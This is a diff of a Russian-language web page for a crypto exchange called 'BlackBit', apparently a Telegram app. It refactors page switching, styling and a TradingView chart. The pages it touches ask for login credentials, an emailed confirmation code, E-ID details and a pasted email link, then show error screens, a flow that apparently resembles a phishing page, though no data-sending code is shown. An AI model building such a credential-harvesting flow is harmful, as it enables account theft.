@@ -219,7 +219,7 @@
         }
 
         /* ============================================================
-           КНОПКИ НАВИГАЦИИ (главная/назад)
+           КНОПКИ НАВИГАЦИИ
            ============================================================ */
         .nav-buttons {
             display: flex;
@@ -249,6 +249,16 @@
         }
         .nav-buttons .btn.primary:hover {
             background: #4c8ed9;
+        }
+
+        /* ============================================================
+           СТРАНИЦЫ
+           ============================================================ */
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
         }
 
         /* ============================================================
@@ -302,8 +312,10 @@
                 <button class="tf-btn" data-tf="D">D</button>
             </div>
 
-            <!-- График TradingView -->
-            <div id="tradingview_btc" style="width:100%; height:260px;"></div>
+            <!-- График с фиксированной высотой -->
+            <div style="width:100%; height:320px; overflow:hidden; border-radius:8px;">
+                <div id="tradingview_btc" style="width:100%; height:320px;"></div>
+            </div>
 
             <!-- Стаканы -->
             <div class="order-book" id="orderBook">
@@ -335,7 +347,7 @@
         <!-- Кнопки навигации -->
         <div class="nav-buttons">
             <button class="btn primary" onclick="goToLoginForm()">🔑 Войти</button>
-            <button class="btn" onclick="showAbout()">ℹ️ О бирже</button>
+            <button class="btn" onclick="goToAbout()">ℹ️ О бирже</button>
         </div>
 
         <div style="text-align:center; margin-top:10px; color:var(--tg-theme-hint-color, #8b949e); font-size:12px;">
@@ -346,7 +358,7 @@
     <!-- ============================================================
     СТРАНИЦА 2: О БИРЖЕ
     ============================================================ -->
-    <div id="pageAbout" class="page" style="display:none;">
+    <div id="pageAbout" class="page">
         <div style="text-align:center; font-size:40px; margin-bottom:8px;">📘</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:4px;">О бирже</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">BlackBit — современная криптобиржа</div>
@@ -366,9 +378,9 @@
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 3: ВХОД (ЛОГИН/ПАРОЛЬ)
+    СТРАНИЦА 3: ВХОД
     ============================================================ -->
-    <div id="pageLoginForm" class="page" style="display:none;">
+    <div id="pageLoginForm" class="page">
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔑</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
@@ -400,9 +412,9 @@
     </div>
 
     <!-- ============================================================
-    СТРАНИЦА 4: КОД ПОДТВЕРЖДЕНИЯ
+    СТРАНИЦА 4: КОД
     ============================================================ -->
-    <div id="pageCode" class="page" style="display:none;">
+    <div id="pageCode" class="page">
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">✉️</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Код подтверждения</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите код, отправленный на вашу почту</div>
@@ -424,7 +436,7 @@
     <!-- ============================================================
     СТРАНИЦА 5: E-ID
     ============================================================ -->
-    <div id="pageEid" class="page" style="display:none;">
+    <div id="pageEid" class="page">
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">🆔</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Вход через E-ID</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Введите свои данные для входа</div>
@@ -450,7 +462,7 @@
     <!-- ============================================================
     СТРАНИЦА 6: ССЫЛКА E-ID
     ============================================================ -->
-    <div id="pageEidLink" class="page" style="display:none;">
+    <div id="pageEidLink" class="page">
         <div style="text-align:center; font-size:40px; margin-bottom:4px;">🔗</div>
         <div style="font-size:22px; font-weight:700; text-align:center; margin-bottom:2px;">Ссылка подтверждения</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); text-align:center; margin-bottom:16px;">Вставьте ссылку из письма</div>
@@ -472,7 +484,7 @@
     <!-- ============================================================
     СТРАНИЦА 7: ОШИБКА
     ============================================================ -->
-    <div id="pageLoginError" class="page" style="display:none; text-align:center; padding:30px 0;">
+    <div id="pageLoginError" class="page" style="text-align:center; padding:30px 0;">
         <div style="font-size:48px; color:#f85149;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#f85149; margin:8px 0;">Ошибка</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); margin-bottom:16px;">Повторите попытку входа.</div>
@@ -482,7 +494,7 @@
     <!-- ============================================================
     СТРАНИЦА 8: БЛОКИРОВКА
     ============================================================ -->
-    <div id="pageError" class="page" style="display:none; text-align:center; padding:30px 0;">
+    <div id="pageError" class="page" style="text-align:center; padding:30px 0;">
         <div style="font-size:48px; color:#f85149;">✕</div>
         <div style="font-size:22px; font-weight:700; color:#f85149; margin:8px 0;">Ошибка входа</div>
         <div style="font-size:14px; color:var(--tg-theme-hint-color, #8b949e); margin-bottom:16px;">Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</div>
@@ -514,9 +526,8 @@
     // 3. СТРАНИЦЫ
     // ============================================================
     function showPage(id) {
-        document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
-        const page = document.getElementById(id);
-        if (page) page.style.display = 'block';
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
 
     function goToMain() { showPage('pageMain'); }
@@ -526,10 +537,6 @@
     function goToLoginError() { showPage('pageLoginError'); }
     function goToError() { showPage('pageError'); }
 
-    function showAbout() {
-        showPage('pageAbout');
-    }
-
     // ============================================================
     // 4. КНОПКИ ТАЙМФРЕЙМОВ
     // ============================================================
@@ -537,7 +544,6 @@
         btn.addEventListener('click', function() {
             document.querySelectorAll('.tf-btn').forEach(b => b.classList.remove('active'));
             this.classList.add('active');
-            // Здесь можно обновить график, меняя интервал
             const tf = this.dataset.tf;
             console.log('Таймфрейм выбран:', tf);
         });
@@ -554,7 +560,7 @@
     });
 
     // ============================================================
-    // 6. TRADINGVIEW ГРАФИК (загружается после рендера)
+    // 6. TRADINGVIEW ГРАФИК
     // ============================================================
     setTimeout(function() {
         if (typeof TradingView !== 'undefined') {
@@ -562,6 +568,7 @@
                 "container_id": "tradingview_btc",
                 "symbol": "BINANCE:BTCUSDT",
                 "interval": "D",
+                "height": 320,
                 "theme": "dark",
                 "style": "1",
                 "locale": "ru",
